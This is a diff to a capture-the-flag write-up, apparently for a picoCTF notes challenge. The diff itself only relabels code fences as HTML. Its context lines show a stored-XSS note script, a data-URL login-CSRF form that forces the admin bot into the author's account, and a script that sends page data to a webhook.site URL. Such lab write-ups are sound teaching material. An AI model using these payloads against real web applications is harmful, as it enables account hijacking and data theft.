@@ -35,7 +35,7 @@ I somehow have to get the bot to login into my account, and add the flag to my n
 
 Create the following note. It creates a new note with the title as `window.open("", "pico").document.body.textContent`, this will be done only when we open the url with a `/?exploit`. This is done to prevent recursive note creation when we are
 
-```
+```html
 <form action="/new" method="POST" id="form">
 	<input type="hidden" name="_csrf" value="feh6ty2J-pGJFYvUyRsVmiHJe0zQ37fomL_g">
 	<input id="flagHere" type="text" name="title" placeholder="title">
@@ -56,7 +56,7 @@ if (window.location.search.includes("exploit")){
 ```
 
 `data:text/html` is the workaround used to open html without using an external link. This will make the bot login to my admin account, and then open the notes with `?exploit`. This should create a note with the flag as the title.
-```
+```html
 data:text/html,
 <form action="http://0.0.0.0:8080/login" method="POST" id="loginForm" target="_blank">
     <input type="text" name="username" value="admin">
@@ -85,7 +85,7 @@ Running this we get...
 After that didnt work, I read that only the report options does not have acces to the internet, so I mignt be able to use webhooks when viewing notes. Here is that code.
 
 Create a note with this as the content
-```
+```html
 <script>
   const searchString = "exploit";
   const webhookURL = "https://webhook.site/4270872a-9750-4fd3-bfcb-40cc91a258d1?";
@@ -99,7 +99,7 @@ Create a note with this as the content
 ```
 
 The report code remains almost the same
-```
+```html
 data:text/html,
 <form action="http://0.0.0.0:8080/login" method="POST" id="loginForm" target="_blank">
     <input type="text" name="username" value="admin">
